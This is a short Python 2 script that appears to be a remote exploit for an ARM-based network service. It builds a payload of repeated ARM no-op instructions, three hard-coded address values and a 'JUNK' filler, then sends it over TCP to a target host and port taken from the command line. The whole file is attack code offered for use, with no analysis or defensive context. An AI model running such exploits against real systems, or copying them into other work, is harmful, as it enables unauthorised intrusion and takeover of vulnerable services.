#!/usr/bin/python

import sys, socket

shellcode = ("\x01\x10\xa0\xe1"*26
+"\xfc\x31\xec\x76"
+"\x6c\x5b\xf7\x76"+"JUNK"+"\xc8\x29\xe8\x76")

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)
sock.connect(( sys.argv[1], int(sys.argv[2]) ))
sock.send(shellcode)
sock.close()

print "Shellcode Length: %d" %len(shellcode)

